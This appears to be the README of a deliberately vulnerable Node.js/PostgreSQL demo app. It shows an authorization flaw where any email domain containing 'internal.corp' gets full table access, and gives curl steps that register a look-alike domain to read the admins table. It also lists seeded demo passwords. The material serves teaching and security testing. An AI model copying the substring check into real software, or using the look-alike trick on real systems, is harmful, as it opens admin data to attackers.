# Node.js DB Permissions Leak

Simple Express app backed by PostgreSQL. Department tables, an `admins` table, bearer-token auth, and vendor self-registration. **All table access is decided from the token email domain** — no roles.

## Demo accounts

| Email | Password | Department |
|-------|----------|------------|
| `alice@example.com` | `demo` | sales |
| `dave@example.com` | `demo` | engineers |
| `grace@example.com` | `demo` | marketing |
| `jack@example.com` | `demo` | vendor |
| `root@internal.corp` | `admin` | — |

## Auth flow

Normal vendor — blocked from admin table:

```bash
curl -s -X POST http://localhost:8080/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"jack@example.com","password":"demo"}'

curl -H "Authorization: Bearer $VENDOR_TOKEN" \
  "http://localhost:8080/api/users?table=admins&email=root@internal.corp"
# → 403
```

## The bug

Authorization treats any token whose domain **contains** `internal.corp` as internal — full access to every table, including `admins`:

```javascript
function isInternalEmail(user) {
  return emailDomain(user.email).includes('internal.corp');
}

function authorizeTableAccess(user, table) {
  if (isInternalEmail(user)) {
    return true;
  }
  // ...
}
```

Register a look-alike domain:

```bash
curl -s -X POST http://localhost:8080/auth/register \
  -H "Content-Type: application/json" \
  -d '{
    "email": "jack@internal.corp.evil.com",
    "name": "Jack Vendor",
    "password": "demo",
    "department": "vendor"
  }'

curl -s -X POST http://localhost:8080/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"jack@internal.corp.evil.com","password":"demo"}'
```

| Email | Stored in | Treated as internal | Admin table |
|-------|-----------|---------------------|-------------|
| `jack@example.com` | vendor | no | blocked |
| `root@internal.corp` | admins | yes | allowed |
| `jack@internal.corp.evil.com` | vendor | yes (bug) | **allowed** |

```bash
curl -H "Authorization: Bearer $CRAFTED_TOKEN" \
  "http://localhost:8080/api/users?table=admins&email=root@internal.corp"

curl -H "Authorization: Bearer $CRAFTED_TOKEN" \
  "http://localhost:8080/api/admins?email=root@internal.corp"
```

Both routes use the same email-domain check — no separate admin role.

## Local run

```bash
docker run --rm -p 5432:5432 \
  -e POSTGRES_USER=app \
  -e POSTGRES_PASSWORD=app \
  -e POSTGRES_DB=permissions_leak \
  postgres:16-alpine

yarn install
node src/index.js
```

## Kubernetes

```bash
make deploy
make trigger
```

## Endpoints

| Path | Auth | Description |
|------|------|-------------|
| `GET /health` | — | Health check |
| `GET /auth/demo-accounts` | — | Seeded demo credentials |
| `POST /auth/register` | — | Vendor self-registration |
| `POST /auth/login` | — | Returns bearer token (email + department) |
| `GET /auth/me` | Bearer | Current session |
| `GET /api/users?email=` | Bearer | Directory search; access from token email domain |
| `GET /api/admins?email=` | Bearer | Admin directory; same email-domain check |

## Tables

| API alias | Postgres table | Notes |
|-----------|----------------|-------|
| `sales` | `sales` | Sales team directory |
| `engineers` | `engineers` | Engineering team directory |
| `marketing` | `marketing` | Marketing team directory |
| `vendor` | `vendor` | Vendor contacts directory |
| `admins` | `admins` | Internal admin directory |
